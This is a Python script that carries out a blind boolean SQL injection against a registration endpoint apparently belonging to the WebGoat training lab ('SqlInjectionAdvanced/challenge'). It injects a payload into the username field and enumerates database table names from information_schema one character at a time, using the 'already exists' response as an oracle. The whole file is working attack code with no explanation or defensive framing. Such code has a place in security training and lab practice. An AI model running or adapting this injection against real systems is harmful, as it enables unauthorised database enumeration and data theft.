import json
import requests

def find_all_tables(cookie, server_url):
    """
    Finds all table names in the database.
    
    Args:
        cookie (str): Session cookie for authentication.
        server_url (str): The URL of the server to target.

    Returns:
        list: A list of table names.
    """
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    headers = {
        'Cookie': cookie,
    }

    def check_table_exists(starting_char, table_index, table_number):
        payload = "' OR (SELECT substring(table_name, {}, 1) FROM information_schema.tables LIMIT 1 OFFSET {}) = '{}' --".format(
            table_index, table_number, starting_char
        )
        data = {
            'username_reg': payload,
            'email_reg': 'a@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }
        r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)

        try:
            response = json.loads(r.text)
        except:
            print("Server error or invalid response.")
            return False

        return "already exists" in response.get('feedback', '')

    table_names = []
    table_number = 0
    while True:
        table_name = ''
        table_index = 1

        while True:
            char_found = False
            for char in alphabet:
                if check_table_exists(char, table_index, table_number):
                    table_name += char
                    table_index += 1
                    char_found = True
                    break

            if not char_found:
                if table_name:
                    table_names.append(table_name)
                break

        if not table_name:
            break

        table_number += 1

    return table_names
